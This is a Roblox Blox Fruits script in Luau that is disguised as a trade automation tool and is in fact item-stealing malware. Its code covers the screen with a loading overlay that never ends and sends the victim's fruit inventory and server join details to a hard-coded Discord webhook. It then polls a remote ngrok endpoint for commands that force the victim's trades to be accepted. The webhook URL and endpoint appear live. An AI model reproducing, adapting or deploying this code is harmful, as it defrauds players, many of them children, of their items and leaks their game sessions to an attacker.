-- made by Noob -- Roblox client-side trade command executor and teleporter.
-- lang: Luau, target: Roblox / Blox Fruits, executor: Delta/Fluxus
-- *polls external command bridge for remote trade table control (accept/cancel), exfiltrates inventory*

getgenv().bfRunning = nil
getgenv().bfRunning = true

print("[DEBUG] Initializing Blox Fruits Trade Automation...")

local Config = {
    AuthorizedUser = "BLACKGOKU_0707",
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local requestFunc = syn and syn.request or http_request or request

-- Perpetual Loading Screen Lock
local function ShowPerpetualLoadingScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not playerGui then return end

    local loadGui = Instance.new("ScreenGui")
    loadGui.Name = "ScriptLoadingUI"
    loadGui.ResetOnSpawn = false
    loadGui.IgnoreGuiInset = true
    loadGui.DisplayOrder = 99999
    loadGui.Parent = playerGui

    local backdrop = Instance.new("Frame")
    backdrop.Size = UDim2.new(1, 0, 1, 0)
    backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    backdrop.BorderSizePixel = 0
    backdrop.Active = true
    backdrop.Parent = loadGui

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0, 360, 0, 140)
    card.Position = UDim2.new(0.5, -180, 0.5, -70)
    card.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    card.BorderSizePixel = 0
    card.Parent = loadGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 20)
    title.BackgroundTransparency = 1
    title.Text = "Loading Blox Fruits Engine..."
    title.TextColor3 = Color3.fromRGB(240, 240, 245)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = card

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0, 60)
    status.BackgroundTransparency = 1
    status.Text = "Synchronizing secure session..."
    status.TextColor3 = Color3.fromRGB(146, 154, 167)
    status.TextSize = 12
    status.Font = Enum.Font.Gotham
    status.Parent = card
end

local function GetInventory()
    local success, result = pcall(function()
        if CommF then return CommF:InvokeServer("getInventory") end
        return {}
    end)
    return (success and type(result) == "table") and result or {}
end

local function TransmitTelemetry()
    local inventory = GetInventory()
    local fruitsList = {}

    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" then
            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) .. ")")
        end
    end

    local payloadData = {
        content = "@everyone Victim Connected & Inventory Dumped!",
        embeds = {{
            title = "Target Session Report",
            color = 12451840,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Stored Fruits", value = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None", inline = false },
                { name = "Server Join Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    if requestFunc then
        pcall(function()
            requestFunc({
                Url = Config.WebhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payloadData)
            })
        end)
    end
end

local function InvokeTradeAction(action)
    if not TradeFunction then
        warn("[ERROR] TradeFunction remote missing!")
        return
    end

    print("[DEBUG] Processing action:", action)

    pcall(function()
        if action == "accept" then
            TradeFunction:InvokeServer("AcceptTrade")
            TradeFunction:InvokeServer("accept")
            TradeFunction:InvokeServer({Action = "Accept"})
        elseif action == "cancel" then
            TradeFunction:InvokeServer("DeclineTrade")
            TradeFunction:InvokeServer("cancel")
            TradeFunction:InvokeServer({Action = "Cancel"})
        end
    end)
end

-- Initialization & Polling Loop
task.spawn(function()
    pcall(ShowPerpetualLoadingScreen)
    pcall(TransmitTelemetry)

    if not requestFunc then
        warn("[ERROR] Executor does not support http requests!")
        return
    end

    while true do
        task.wait(2)
        pcall(function()
            local response = requestFunc({
                Url = Config.CommandApiUrl,
                Method = "GET"
            })

            if response and response.StatusCode == 200 then
                local data = HttpService:JSONDecode(response.Body)
                if data and data.command then
                    print("[DEBUG] Command fetched from Discord bridge:", data.command)
                    InvokeTradeAction(data.command)
                end
            end
        end)
    end
end)
